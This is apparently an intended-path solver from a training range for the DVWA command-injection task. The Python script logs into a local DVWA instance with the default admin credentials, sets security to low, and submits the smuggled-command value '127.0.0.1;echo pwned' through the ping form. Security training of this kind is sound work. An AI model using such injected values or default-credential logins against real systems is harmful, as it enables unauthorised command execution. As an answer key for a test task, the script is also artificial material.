"""Intended-path solver for dvwa-cmdi.

Drives the real DVWA instance end to end: waits for the database-backed
login page, initializes the database through setup.php, signs in with the
default admin account, drops security to low via the security page, then
runs the command-injection payload through the level's own form.
"""

import re
import time

import httpx
from openrange.content.solver import SolveResult, TaskResult

ANSWER = "pwned"
TOKEN_RE = re.compile(r"user_token' value='([0-9a-f]+)")


def _token(html: str) -> str | None:
    match = TOKEN_RE.search(html)
    return match.group(1) if match else None


def solve(ctx) -> SolveResult:
    task = TaskResult(task_id="cmdi-echo", ok=False)
    with httpx.Client(base_url=ctx.url(), timeout=20.0) as client:
        deadline = time.monotonic() + 120
        ready = False
        while time.monotonic() < deadline:
            page = client.get("/login.php")
            if page.status_code == 200 and _token(page.text) and "Fatal error" not in page.text:
                ready = True
                break
            time.sleep(2)
        if not ready:
            task.detail = "dvwa never rendered a usable login page"
            return SolveResult(results=[task])

        token = _token(client.get("/setup.php").text)
        if token:
            client.post(
                "/setup.php",
                data={"create_db": "Create / Reset Database", "user_token": token},
            )

        token = _token(client.get("/login.php").text)
        client.post(
            "/login.php",
            data={
                "username": "admin",
                "password": "password",
                "user_token": token,
                "Login": "Login",
            },
        )

        token = _token(client.get("/security.php").text)
        client.post(
            "/security.php",
            data={"security": "low", "user_token": token, "seclev_submit": "Submit"},
        )

        result = client.post(
            "/vulnerabilities/exec/",
            data={"ip": "127.0.0.1;echo pwned", "Submit": "Submit"},
        )
        task.ok = ANSWER in result.text
        task.captured = ANSWER if task.ok else None
        task.detail = f"exec response status {result.status_code}"
    return SolveResult(results=[task])
